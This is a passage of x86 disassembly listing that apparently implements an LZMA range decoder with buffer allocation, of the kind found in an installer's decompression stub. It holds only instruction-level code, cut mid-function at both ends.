  406bcd:	75 f4                	jne    0x406bc3
  406bcf:	83 65 b8 00          	andl   $0x0,-0x48(%ebp)
  406bd3:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406bd7:	eb 26                	jmp    0x406bff
  406bd9:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406bdd:	0f 84 a6 08 00 00    	je     0x407489
  406be3:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406be6:	ff 4d 94             	decl   -0x6c(%ebp)
  406be9:	8b c8                	mov    %eax,%ecx
  406beb:	8b 45 90             	mov    -0x70(%ebp),%eax
  406bee:	c1 e1 03             	shl    $0x3,%ecx
  406bf1:	0f b6 00             	movzbl (%eax),%eax
  406bf4:	d3 e0                	shl    %cl,%eax
  406bf6:	09 45 c0             	or     %eax,-0x40(%ebp)
  406bf9:	ff 45 90             	incl   -0x70(%ebp)
  406bfc:	ff 45 b8             	incl   -0x48(%ebp)
  406bff:	83 7d b8 04          	cmpl   $0x4,-0x48(%ebp)
  406c03:	7c d4                	jl     0x406bd9
  406c05:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406c08:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406c0b:	74 28                	je     0x406c35
  406c0d:	83 7d f8 00          	cmpl   $0x0,-0x8(%ebp)
  406c11:	89 45 8c             	mov    %eax,-0x74(%ebp)
  406c14:	74 09                	je     0x406c1f
  406c16:	ff 75 f8             	push   -0x8(%ebp)
  406c19:	ff 15 0c 81 40 00    	call   *0x40810c
  406c1f:	ff 75 c0             	push   -0x40(%ebp)
  406c22:	6a 40                	push   $0x40
  406c24:	ff 15 10 81 40 00    	call   *0x408110
  406c2a:	85 c0                	test   %eax,%eax
  406c2c:	89 45 f8             	mov    %eax,-0x8(%ebp)
  406c2f:	0f 84 00 09 00 00    	je     0x407535
  406c35:	8b 45 f8             	mov    -0x8(%ebp),%eax
  406c38:	8b 4d 8c             	mov    -0x74(%ebp),%ecx
  406c3b:	c7 45 b8 05 00 00 00 	movl   $0x5,-0x48(%ebp)
  406c42:	80 64 08 ff 00       	andb   $0x0,-0x1(%eax,%ecx,1)
  406c47:	eb 21                	jmp    0x406c6a
  406c49:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406c4d:	0f 84 45 08 00 00    	je     0x407498
  406c53:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406c56:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406c59:	ff 4d 94             	decl   -0x6c(%ebp)
  406c5c:	0f b6 09             	movzbl (%ecx),%ecx
  406c5f:	c1 e0 08             	shl    $0x8,%eax
  406c62:	0b c1                	or     %ecx,%eax
  406c64:	ff 45 90             	incl   -0x70(%ebp)
  406c67:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406c6a:	8b 45 b8             	mov    -0x48(%ebp),%eax
  406c6d:	ff 4d b8             	decl   -0x48(%ebp)
  406c70:	85 c0                	test   %eax,%eax
  406c72:	75 d5                	jne    0x406c49
  406c74:	8b 45 a0             	mov    -0x60(%ebp),%eax
  406c77:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406c7a:	23 45 e4             	and    -0x1c(%ebp),%eax
  406c7d:	c7 85 7c ff ff ff 06 	movl   $0x6,-0x84(%ebp)
  406c84:	00 00 00 
  406c87:	c1 e1 04             	shl    $0x4,%ecx
  406c8a:	89 45 b4             	mov    %eax,-0x4c(%ebp)
  406c8d:	03 c8                	add    %eax,%ecx
  406c8f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406c92:	8d 34 48             	lea    (%eax,%ecx,2),%esi
  406c95:	e9 6c 06 00 00       	jmp    0x407306
  406c9a:	33 d2                	xor    %edx,%edx
  406c9c:	39 55 c0             	cmp    %edx,-0x40(%ebp)
  406c9f:	75 6f                	jne    0x406d10
  406ca1:	0f b6 45 a4          	movzbl -0x5c(%ebp),%eax
  406ca5:	8b 75 a0             	mov    -0x60(%ebp),%esi
  406ca8:	b1 08                	mov    $0x8,%cl
  406caa:	2a 4d c4             	sub    -0x3c(%ebp),%cl
  406cad:	23 75 e8             	and    -0x18(%ebp),%esi
  406cb0:	d3 e8                	shr    %cl,%eax
  406cb2:	8b 4d c4             	mov    -0x3c(%ebp),%ecx
  406cb5:	d3 e6                	shl    %cl,%esi
  406cb7:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406cba:	03 c6                	add    %esi,%eax
  406cbc:	8d 04 40             	lea    (%eax,%eax,2),%eax
  406cbf:	c1 e0 09             	shl    $0x9,%eax
  406cc2:	83 7d c8 04          	cmpl   $0x4,-0x38(%ebp)
  406cc6:	8d 84 08 6c 0e 00 00 	lea    0xe6c(%eax,%ecx,1),%eax
  406ccd:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406cd0:	7d 05                	jge    0x406cd7
  406cd2:	89 55 c8             	mov    %edx,-0x38(%ebp)
  406cd5:	eb 10                	jmp    0x406ce7
  406cd7:	83 7d c8 0a          	cmpl   $0xa,-0x38(%ebp)
  406cdb:	7d 06                	jge    0x406ce3
  406cdd:	83 6d c8 03          	subl   $0x3,-0x38(%ebp)
  406ce1:	eb 04                	jmp    0x406ce7
  406ce3:	83 6d c8 06          	subl   $0x6,-0x38(%ebp)
  406ce7:	39 55 cc             	cmp    %edx,-0x34(%ebp)
  406cea:	74 1c                	je     0x406d08
  406cec:	8b 45 ec             	mov    -0x14(%ebp),%eax
  406cef:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  406cf2:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  406cf5:	72 03                	jb     0x406cfa
  406cf7:	03 45 8c             	add    -0x74(%ebp),%eax
  406cfa:	8b 4d f8             	mov    -0x8(%ebp),%ecx
  406cfd:	33 db                	xor    %ebx,%ebx
  406cff:	43                   	inc    %ebx
  406d00:	8a 04 08             	mov    (%eax,%ecx,1),%al
  406d03:	88 45 a5             	mov    %al,-0x5b(%ebp)
  406d06:	eb 68                	jmp    0x406d70
  406d08:	33 db                	xor    %ebx,%ebx
  406d0a:	43                   	inc    %ebx
  406d0b:	e9 cd 01 00 00       	jmp    0x406edd
  406d10:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406d13:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406d16:	c7 45 cc 01 00 00 00 	movl   $0x1,-0x34(%ebp)
  406d1d:	c7 85 7c ff ff ff 07 	movl   $0x7,-0x84(%ebp)
  406d24:	00 00 00 
  406d27:	8d b4 48 80 01 00 00 	lea    0x180(%eax,%ecx,2),%esi
  406d2e:	e9 d3 05 00 00       	jmp    0x407306
  406d33:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406d37:	0f 84 67 07 00 00    	je     0x4074a4
  406d3d:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406d40:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406d43:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406d47:	0f b6 09             	movzbl (%ecx),%ecx
  406d4a:	ff 4d 94             	decl   -0x6c(%ebp)
  406d4d:	c1 e0 08             	shl    $0x8,%eax
  406d50:	0b c1                	or     %ecx,%eax
  406d52:	ff 45 90             	incl   -0x70(%ebp)
  406d55:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406d58:	8b 45 c0             	mov    -0x40(%ebp),%eax
  406d5b:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  406d5e:	0f 85 ad 00 00 00    	jne    0x406e11
  406d64:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406d6a:	0f 8d 05 01 00 00    	jge    0x406e75
  406d70:	0f b6 45 a5          	movzbl -0x5b(%ebp),%eax
  406d74:	d0 65 a5             	shlb   $1,-0x5b(%ebp)
  406d77:	8b 4d a8             	mov    -0x58(%ebp),%ecx
  406d7a:	c1 e8 07             	shr    $0x7,%eax
  406d7d:	89 45 b8             	mov    %eax,-0x48(%ebp)
  406d80:	40                   	inc    %eax
  406d81:	c1 e0 08             	shl    $0x8,%eax
  406d84:	03 c3                	add    %ebx,%eax
  406d86:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406d89:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406d8c:	c1 e9 0b             	shr    $0xb,%ecx
  406d8f:	66 8b 06             	mov    (%esi),%ax
  406d92:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406d95:	0f b7 d0             	movzwl %ax,%edx
  406d98:	0f af ca             	imul   %edx,%ecx
  406d9b:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406d9e:	73 1a                	jae    0x406dba
  406da0:	83 65 c0 00          	andl   $0x0,-0x40(%ebp)
  406da4:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406da7:	b9 00 08 00 00       	mov    $0x800,%ecx
  406dac:	2b ca                	sub    %edx,%ecx
  406dae:	c1 f9 05             	sar    $0x5,%ecx
  406db1:	03 c8                	add    %eax,%ecx
  406db3:	03 db                	add    %ebx,%ebx
  406db5:	66 89 0e             	mov    %cx,(%esi)
  406db8:	eb 1d                	jmp    0x406dd7
  406dba:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406dbd:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406dc0:	66 8b c8             	mov    %ax,%cx
  406dc3:	c7 45 c0 01 00 00 00 	movl   $0x1,-0x40(%ebp)
  406dca:	66 c1 e9 05          	shr    $0x5,%cx
  406dce:	2b c1                	sub    %ecx,%eax
  406dd0:	8d 5c 1b 01          	lea    0x1(%ebx,%ebx,1),%ebx
  406dd4:	66 89 06             	mov    %ax,(%esi)
  406dd7:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406dde:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406de1:	0f 83 71 ff ff ff    	jae    0x406d58
  406de7:	e9 47 ff ff ff       	jmp    0x406d33
  406dec:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406df0:	0f 84 ba 06 00 00    	je     0x4074b0
  406df6:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406df9:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406dfc:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406e00:	0f b6 09             	movzbl (%ecx),%ecx
  406e03:	ff 4d 94             	decl   -0x6c(%ebp)
  406e06:	c1 e0 08             	shl    $0x8,%eax
  406e09:	0b c1                	or     %ecx,%eax
  406e0b:	ff 45 90             	incl   -0x70(%ebp)
  406e0e:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406e11:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406e17:	7d 5c                	jge    0x406e75
  406e19:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406e1c:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406e1f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406e22:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406e25:	c1 e9 0b             	shr    $0xb,%ecx
  406e28:	66 8b 06             	mov    (%esi),%ax
  406e2b:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406e2e:	0f b7 f8             	movzwl %ax,%edi
  406e31:	0f af cf             	imul   %edi,%ecx
  406e34:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406e37:	73 16                	jae    0x406e4f
  406e39:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406e3c:	b9 00 08 00 00       	mov    $0x800,%ecx
  406e41:	2b cf                	sub    %edi,%ecx
  406e43:	c1 f9 05             	sar    $0x5,%ecx
  406e46:	03 c8                	add    %eax,%ecx
  406e48:	03 db                	add    %ebx,%ebx
  406e4a:	66 89 0e             	mov    %cx,(%esi)
  406e4d:	eb 15                	jmp    0x406e64
  406e4f:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406e52:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406e55:	66 8b c8             	mov    %ax,%cx
  406e58:	8d 5a 01             	lea    0x1(%edx),%ebx
  406e5b:	66 c1 e9 05          	shr    $0x5,%cx
  406e5f:	2b c1                	sub    %ecx,%eax
  406e61:	66 89 06             	mov    %ax,(%esi)
  406e64:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406e6b:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406e6e:	73 a1                	jae    0x406e11
  406e70:	e9 77 ff ff ff       	jmp    0x406dec
  406e75:	83 65 cc 00          	andl   $0x0,-0x34(%ebp)
  406e79:	8a 45 bc             	mov    -0x44(%ebp),%al
  406e7c:	88 45 a4             	mov    %al,-0x5c(%ebp)
  406e7f:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  406e83:	0f 84 3f 06 00 00    	je     0x4074c8
  406e89:	8b 4d 98             	mov    -0x68(%ebp),%ecx
  406e8c:	8a 45 a4             	mov    -0x5c(%ebp),%al
  406e8f:	8b 55 f8             	mov    -0x8(%ebp),%edx
  406e92:	ff 45 a0             	incl   -0x60(%ebp)
  406e95:	ff 45 98             	incl   -0x68(%ebp)
  406e98:	ff 4d 9c             	decl   -0x64(%ebp)
  406e9b:	88 01                	mov    %al,(%ecx)
  406e9d:	8b 4d ec             	mov    -0x14(%ebp),%ecx
  406ea0:	88 04 11             	mov    %al,(%ecx,%edx,1)
  406ea3:	8d 41 01             	lea    0x1(%ecx),%eax
  406ea6:	33 d2                	xor    %edx,%edx
  406ea8:	f7 75 8c             	divl   -0x74(%ebp)
  406eab:	e9 95 01 00 00       	jmp    0x407045
  406eb0:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  406eb4:	0f 84 02 06 00 00    	je     0x4074bc
  406eba:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  406ebd:	8b 45 f4             	mov    -0xc(%ebp),%eax
  406ec0:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  406ec4:	0f b6 09             	movzbl (%ecx),%ecx
  406ec7:	ff 4d 94             	decl   -0x6c(%ebp)
  406eca:	c1 e0 08             	shl    $0x8,%eax
  406ecd:	0b c1                	or     %ecx,%eax
  406ecf:	ff 45 90             	incl   -0x70(%ebp)
  406ed2:	89 45 f4             	mov    %eax,-0xc(%ebp)
  406ed5:	81 fb 00 01 00 00    	cmp    $0x100,%ebx
  406edb:	7d 9c                	jge    0x406e79
  406edd:	8b 45 a8             	mov    -0x58(%ebp),%eax
  406ee0:	8d 14 1b             	lea    (%ebx,%ebx,1),%edx
  406ee3:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  406ee6:	8d 34 02             	lea    (%edx,%eax,1),%esi
  406ee9:	c1 e9 0b             	shr    $0xb,%ecx
  406eec:	66 8b 06             	mov    (%esi),%ax
  406eef:	89 75 ac             	mov    %esi,-0x54(%ebp)
  406ef2:	0f b7 f8             	movzwl %ax,%edi
  406ef5:	0f af cf             	imul   %edi,%ecx
  406ef8:	39 4d f4             	cmp    %ecx,-0xc(%ebp)
  406efb:	73 16                	jae    0x406f13
  406efd:	89 4d f0             	mov    %ecx,-0x10(%ebp)
  406f00:	b9 00 08 00 00       	mov    $0x800,%ecx
  406f05:	2b cf                	sub    %edi,%ecx
  406f07:	c1 f9 05             	sar    $0x5,%ecx
  406f0a:	03 c8                	add    %eax,%ecx
  406f0c:	03 db                	add    %ebx,%ebx
  406f0e:	66 89 0e             	mov    %cx,(%esi)
  406f11:	eb 15                	jmp    0x406f28
  406f13:	29 4d f0             	sub    %ecx,-0x10(%ebp)
  406f16:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  406f19:	66 8b c8             	mov    %ax,%cx
  406f1c:	8d 5a 01             	lea    0x1(%edx),%ebx
  406f1f:	66 c1 e9 05          	shr    $0x5,%cx
  406f23:	2b c1                	sub    %ecx,%eax
  406f25:	66 89 06             	mov    %ax,(%esi)
  406f28:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  406f2f:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  406f32:	73 a1                	jae    0x406ed5
  406f34:	e9 77 ff ff ff       	jmp    0x406eb0
  406f39:	83 7d c0 01          	cmpl   $0x1,-0x40(%ebp)
  406f3d:	75 1c                	jne    0x406f5b
  406f3f:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f42:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406f45:	c7 85 7c ff ff ff 08 	movl   $0x8,-0x84(%ebp)
  406f4c:	00 00 00 
  406f4f:	8d b4 48 98 01 00 00 	lea    0x198(%eax,%ecx,2),%esi
  406f56:	e9 ab 03 00 00       	jmp    0x407306
  406f5b:	8b 45 dc             	mov    -0x24(%ebp),%eax
  406f5e:	c7 45 80 16 00 00 00 	movl   $0x16,-0x80(%ebp)
  406f65:	89 45 e0             	mov    %eax,-0x20(%ebp)
  406f68:	8b 45 d8             	mov    -0x28(%ebp),%eax
  406f6b:	89 45 dc             	mov    %eax,-0x24(%ebp)
  406f6e:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  406f71:	89 45 d8             	mov    %eax,-0x28(%ebp)
  406f74:	33 c0                	xor    %eax,%eax
  406f76:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  406f7a:	0f 9d c0             	setge  %al
  406f7d:	48                   	dec    %eax
  406f7e:	24 fd                	and    $0xfd,%al
  406f80:	83 c0 0a             	add    $0xa,%eax
  406f83:	89 45 c8             	mov    %eax,-0x38(%ebp)
  406f86:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406f89:	05 64 06 00 00       	add    $0x664,%eax
  406f8e:	89 45 a8             	mov    %eax,-0x58(%ebp)
  406f91:	8b 75 a8             	mov    -0x58(%ebp),%esi
  406f94:	c7 85 7c ff ff ff 12 	movl   $0x12,-0x84(%ebp)
  406f9b:	00 00 00 
  406f9e:	e9 63 03 00 00       	jmp    0x407306
  406fa3:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406fa7:	75 21                	jne    0x406fca
  406fa9:	8b 45 c8             	mov    -0x38(%ebp),%eax
  406fac:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  406faf:	83 c0 0f             	add    $0xf,%eax
  406fb2:	c7 85 7c ff ff ff 09 	movl   $0x9,-0x84(%ebp)
  406fb9:	00 00 00 
  406fbc:	c1 e0 04             	shl    $0x4,%eax
  406fbf:	03 45 b4             	add    -0x4c(%ebp),%eax
  406fc2:	8d 34 41             	lea    (%ecx,%eax,2),%esi
  406fc5:	e9 3c 03 00 00       	jmp    0x407306
  406fca:	8b 45 fc             	mov    -0x4(%ebp),%eax
  406fcd:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  406fd0:	c7 85 7c ff ff ff 0a 	movl   $0xa,-0x84(%ebp)
  406fd7:	00 00 00 
  406fda:	8d b4 48 b0 01 00 00 	lea    0x1b0(%eax,%ecx,2),%esi
  406fe1:	e9 20 03 00 00       	jmp    0x407306
  406fe6:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  406fea:	0f 85 b1 00 00 00    	jne    0x4070a1
  406ff0:	83 7d a0 00          	cmpl   $0x0,-0x60(%ebp)
  406ff4:	0f 84 3b 05 00 00    	je     0x407535
  406ffa:	33 c0                	xor    %eax,%eax
  406ffc:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  407000:	0f 9d c0             	setge  %al
  407003:	8d 44 00 09          	lea    0x9(%eax,%eax,1),%eax
  407007:	89 45 c8             	mov    %eax,-0x38(%ebp)
  40700a:	83 7d 9c 00          	cmpl   $0x0,-0x64(%ebp)
  40700e:	0f 84 c0 04 00 00    	je     0x4074d4
  407014:	8b 45 ec             	mov    -0x14(%ebp),%eax
  407017:	2b 45 d4             	sub    -0x2c(%ebp),%eax
  40701a:	3b 45 8c             	cmp    -0x74(%ebp),%eax
  40701d:	72 03                	jb     0x407022
  40701f:	03 45 8c             	add    -0x74(%ebp),%eax
  407022:	8b 55 f8             	mov    -0x8(%ebp),%edx
  407025:	8a 0c 10             	mov    (%eax,%edx,1),%cl
  407028:	8b 45 ec             	mov    -0x14(%ebp),%eax
  40702b:	88 4d a4             	mov    %cl,-0x5c(%ebp)
  40702e:	88 0c 10             	mov    %cl,(%eax,%edx,1)
  407031:	40                   	inc    %eax
  407032:	33 d2                	xor    %edx,%edx
  407034:	f7 75 8c             	divl   -0x74(%ebp)
  407037:	8b 45 98             	mov    -0x68(%ebp),%eax
  40703a:	ff 45 a0             	incl   -0x60(%ebp)
  40703d:	ff 45 98             	incl   -0x68(%ebp)
  407040:	ff 4d 9c             	decl   -0x64(%ebp)
  407043:	88 08                	mov    %cl,(%eax)
  407045:	89 55 ec             	mov    %edx,-0x14(%ebp)
  407048:	c7 85 78 ff ff ff 02 	movl   $0x2,-0x88(%ebp)
  40704f:	00 00 00 
  407052:	e9 c7 fa ff ff       	jmp    0x406b1e
  407057:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  40705b:	75 05                	jne    0x407062
  40705d:	8b 45 d8             	mov    -0x28(%ebp),%eax
  407060:	eb 36                	jmp    0x407098
  407062:	8b 45 fc             	mov    -0x4(%ebp),%eax
  407065:	8b 4d c8             	mov    -0x38(%ebp),%ecx
  407068:	c7 85 7c ff ff ff 0b 	movl   $0xb,-0x84(%ebp)
  40706f:	00 00 00 
  407072:	8d b4 48 c8 01 00 00 	lea    0x1c8(%eax,%ecx,2),%esi
  407079:	e9 88 02 00 00       	jmp    0x407306
  40707e:	83 7d c0 00          	cmpl   $0x0,-0x40(%ebp)
  407082:	75 05                	jne    0x407089
  407084:	8b 45 dc             	mov    -0x24(%ebp),%eax
  407087:	eb 09                	jmp    0x407092
  407089:	8b 4d dc             	mov    -0x24(%ebp),%ecx
  40708c:	8b 45 e0             	mov    -0x20(%ebp),%eax
  40708f:	89 4d e0             	mov    %ecx,-0x20(%ebp)
  407092:	8b 4d d8             	mov    -0x28(%ebp),%ecx
  407095:	89 4d dc             	mov    %ecx,-0x24(%ebp)
  407098:	8b 4d d4             	mov    -0x2c(%ebp),%ecx
  40709b:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  40709e:	89 4d d8             	mov    %ecx,-0x28(%ebp)
  4070a1:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4070a4:	c7 45 80 15 00 00 00 	movl   $0x15,-0x80(%ebp)
  4070ab:	05 68 0a 00 00       	add    $0xa68,%eax
  4070b0:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4070b3:	e9 d9 fe ff ff       	jmp    0x406f91
  4070b8:	33 c0                	xor    %eax,%eax
  4070ba:	83 7d c8 07          	cmpl   $0x7,-0x38(%ebp)
  4070be:	0f 9d c0             	setge  %al
  4070c1:	48                   	dec    %eax
  4070c2:	24 fd                	and    $0xfd,%al
  4070c4:	83 c0 0b             	add    $0xb,%eax
  4070c7:	89 45 c8             	mov    %eax,-0x38(%ebp)
  4070ca:	e9 9a 01 00 00       	jmp    0x407269
  4070cf:	8b 45 d0             	mov    -0x30(%ebp),%eax
  4070d2:	83 f8 04             	cmp    $0x4,%eax
  4070d5:	7c 03                	jl     0x4070da
  4070d7:	6a 03                	push   $0x3
  4070d9:	58                   	pop    %eax
  4070da:	8b 4d fc             	mov    -0x4(%ebp),%ecx
  4070dd:	c7 45 c0 06 00 00 00 	movl   $0x6,-0x40(%ebp)
  4070e4:	c1 e0 07             	shl    $0x7,%eax
  4070e7:	c7 45 84 19 00 00 00 	movl   $0x19,-0x7c(%ebp)
  4070ee:	8d 84 08 60 03 00 00 	lea    0x360(%eax,%ecx,1),%eax
  4070f5:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4070f8:	e9 ce 02 00 00       	jmp    0x4073cb
  4070fd:	83 fb 04             	cmp    $0x4,%ebx
  407100:	7c 34                	jl     0x407136
  407102:	8b cb                	mov    %ebx,%ecx
  407104:	8b c3                	mov    %ebx,%eax
  407106:	d1 f9                	sar    $1,%ecx
  407108:	83 e0 01             	and    $0x1,%eax
  40710b:	49                   	dec    %ecx
  40710c:	0c 02                	or     $0x2,%al
  40710e:	d3 e0                	shl    %cl,%eax
  407110:	83 fb 0e             	cmp    $0xe,%ebx
  407113:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  407116:	7d 14                	jge    0x40712c
  407118:	8b 55 fc             	mov    -0x4(%ebp),%edx
  40711b:	2b c3                	sub    %ebx,%eax
  40711d:	89 4d c0             	mov    %ecx,-0x40(%ebp)
  407120:	8d 84 42 5e 05 00 00 	lea    0x55e(%edx,%eax,2),%eax
  407127:	e9 81 00 00 00       	jmp    0x4071ad
  40712c:	33 db                	xor    %ebx,%ebx
  40712e:	83 c1 fc             	add    $0xfffffffc,%ecx
  407131:	89 4d b8             	mov    %ecx,-0x48(%ebp)
  407134:	eb 33                	jmp    0x407169
  407136:	89 5d d4             	mov    %ebx,-0x2c(%ebp)
  407139:	e9 28 01 00 00       	jmp    0x407266
  40713e:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  407142:	0f 84 98 03 00 00    	je     0x4074e0
  407148:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  40714b:	8b 45 f4             	mov    -0xc(%ebp),%eax
  40714e:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  407152:	0f b6 09             	movzbl (%ecx),%ecx
  407155:	ff 4d 94             	decl   -0x6c(%ebp)
  407158:	c1 e0 08             	shl    $0x8,%eax
  40715b:	0b c1                	or     %ecx,%eax
  40715d:	ff 45 90             	incl   -0x70(%ebp)
  407160:	89 45 f4             	mov    %eax,-0xc(%ebp)
  407163:	8b 45 d4             	mov    -0x2c(%ebp),%eax
  407166:	ff 4d b8             	decl   -0x48(%ebp)
  407169:	83 7d b8 00          	cmpl   $0x0,-0x48(%ebp)
  40716d:	7e 27                	jle    0x407196
  40716f:	8b 4d f4             	mov    -0xc(%ebp),%ecx
  407172:	03 db                	add    %ebx,%ebx
  407174:	d1 6d f0             	shrl   $1,-0x10(%ebp)
  407177:	3b 4d f0             	cmp    -0x10(%ebp),%ecx
  40717a:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40717d:	72 0c                	jb     0x40718b
  40717f:	8b 4d f0             	mov    -0x10(%ebp),%ecx
  407182:	29 4d f4             	sub    %ecx,-0xc(%ebp)
  407185:	83 cb 01             	or     $0x1,%ebx
  407188:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  40718b:	81 7d f0 00 00 00 01 	cmpl   $0x1000000,-0x10(%ebp)
  407192:	73 d2                	jae    0x407166
  407194:	eb a8                	jmp    0x40713e
  407196:	c1 e3 04             	shl    $0x4,%ebx
  407199:	03 c3                	add    %ebx,%eax
  40719b:	c7 45 c0 04 00 00 00 	movl   $0x4,-0x40(%ebp)
  4071a2:	89 45 d4             	mov    %eax,-0x2c(%ebp)
  4071a5:	8b 45 fc             	mov    -0x4(%ebp),%eax
  4071a8:	05 44 06 00 00       	add    $0x644,%eax
  4071ad:	33 db                	xor    %ebx,%ebx
  4071af:	89 45 a8             	mov    %eax,-0x58(%ebp)
  4071b2:	c7 45 b0 01 00 00 00 	movl   $0x1,-0x50(%ebp)
  4071b9:	89 5d bc             	mov    %ebx,-0x44(%ebp)
  4071bc:	89 5d b8             	mov    %ebx,-0x48(%ebp)
  4071bf:	eb 28                	jmp    0x4071e9
  4071c1:	83 7d 94 00          	cmpl   $0x0,-0x6c(%ebp)
  4071c5:	0f 84 21 03 00 00    	je     0x4074ec
  4071cb:	8b 4d 90             	mov    -0x70(%ebp),%ecx
  4071ce:	8b 45 f4             	mov    -0xc(%ebp),%eax
  4071d1:	c1 65 f0 08          	shll   $0x8,-0x10(%ebp)
  4071d5:	0f b6 09             	movzbl (%ecx),%ecx
  4071d8:	ff 4d 94             	decl   -0x6c(%ebp)
  4071db:	c1 e0 08             	shl    $0x8,%eax
  4071de:	0b c1                	or     %ecx,%eax
  4071e0:	ff 45 90             	incl   -0x70(%ebp)
  4071e3:	89 45 f4             	mov    %eax,-0xc(%ebp)
  4071e6:	ff 45 b8             	incl   -0x48(%ebp)
  4071e9:	8b 45 c0             	mov    -0x40(%ebp),%eax
  4071ec:	39 45 b8             	cmp    %eax,-0x48(%ebp)
  4071ef:	7d 72                	jge    0x407263
  4071f1:	8b 45 b0             	mov    -0x50(%ebp),%eax
  4071f4:	8b 55 f0             	mov    -0x10(%ebp),%edx
  4071f7:	c1 ea 0b             	shr    $0xb,%edx
  4071fa:	8d 3c 00             	lea    (%eax,%eax,1),%edi
  4071fd:	8b 45 a8             	mov    -0x58(%ebp),%eax
  407200:	8d 34 07             	lea    (%edi,%eax,1),%esi
  407203:	89 75 ac             	mov    %esi,-0x54(%ebp)
  407206:	66 8b 06             	mov    (%esi),%ax
  407209:	0f b7 c8             	movzwl %ax,%ecx
  40720c:	0f af d1             	imul   %ecx,%edx
  40720f:	39 55 f4             	cmp    %edx,-0xc(%ebp)
  407212:	73 17                	jae    0x40722b
  407214:	89 55 f0             	mov    %edx,-0x10(%ebp)
  407217:	ba 00 08 00 00       	mov    $0x800,%edx
  40721c:	2b d1                	sub    %ecx,%edx
  40721e:	c1 fa 05             	sar    $0x5,%edx
  407221:	03 d0                	add    %eax,%edx
  407223:	d1 65 b0             	shll   $1,-0x50(%ebp)
  407226:	66 89 16             	mov    %dx,(%esi)
  407229:	eb 2a                	jmp    0x407255
  40722b:	33 c9                	xor    %ecx,%ecx
  40722d:	29 55 f0             	sub    %edx,-0x10(%ebp)
  407230:	41                   	inc    %ecx
  407231:	29 55 f4             	sub    %edx,-0xc(%ebp)
  407234:	8b d9                	mov    %ecx,%ebx
  407236:	8b 4d b8             	mov    -0x48(%ebp),%ecx
  407239:	d3 e3                	shl    %cl,%ebx
  40723b:	8b cb                	mov    %ebx,%ecx
  40723d:	8b 5d bc             	mov    -0x44(%ebp),%ebx
